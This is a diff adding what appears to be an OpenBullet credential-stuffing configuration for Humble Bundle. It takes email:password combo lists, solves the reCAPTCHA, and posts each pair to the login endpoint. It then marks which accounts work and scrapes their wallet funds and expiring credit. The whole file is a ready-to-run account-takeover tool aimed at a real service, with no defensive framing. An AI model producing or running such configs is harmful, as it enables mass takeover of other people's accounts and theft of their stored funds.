@@ -1,0 +1,93 @@
+[SETTINGS]
+{
+  "Name": "humble bundle",
+  "SuggestedBots": 1,
+  "LastModified": "2018-11-08T13:06:23.8038215+00:00",
+  "AdditionalInfo": "",
+  "Author": "bluerar",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "4",
+      "Id": 1186756412
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 3,
+      "RuleString": "50",
+      "Id": 1058969271
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#L1 REQUEST GET "https://www.humblebundle.com" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#K1 KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<SOURCE>" DoesNotContain "Humble Bundle" 
+RECAPTCHA "https://www.humblebundle.com" "6LdsABsUAAAAAAWcUQhPOAGGWP4z9bkKrNaiCeK8" -> VAR "c" 
+#L2 REQUEST POST "https://www.humblebundle.com/processlogin" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&goto=%2F&g-recaptcha-response=<c>&captcha-invisible=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://www.humblebundle.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "CSRF-Prevention-Token: VIVyhOWNCrkjH9u4-1-1540568269" 
+  HEADER "Cookie: csrf_cookie=VIVyhOWNCrkjH9u4-1-1540568269" 
+#K2 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Email and password don't match" 
+  KEYCHAIN Retry OR 
+    KEY "Are you sure you're not a robot" 
+  KEYCHAIN Success OR 
+    KEY "user_terms_opt_in_data" 
+#L3 REQUEST GET "https://www.humblebundle.com/store" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.humblebundle.com/" 
+#L4 REQUEST GET "https://d.mailer.humblebundle.com/contact.php?trackKey=humblebundlelive&contactKey=<USER>&auth=1" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#CID PARSE "<SOURCE>" LR "cID\":\"" "\"" Recursive=FALSE -> VAR "cid" "" "" 
+#L5 REQUEST GET "https://d.mailer.humblebundle.com/cart.php?trackKey=humblebundlelive&contactKey=<cid>&action=clear&data={}" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#L6 REQUEST GET "https://www.humblebundle.com/user/wallet" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#wallet PARSE "<SOURCE>" REGEX "Wallet Funds:[\s]+<\/th>[\s]+<td>[a-z&;\s]+([a-zA-Z0-9$€ .]+)" "[1]" Recursive=FALSE -> CAP "Wallet" "" "" 
+#expiring_wallet_credit PARSE "<SOURCE>" REGEX "Expiring Wallet Credit:[\s]+<\/th>[\s]+<td>[a-z&;\s]+([a-zA-Z0-9$€ .]+)" "[1]" Recursive=FALSE -> CAP "Expiring Wallet Credit" "" "" 
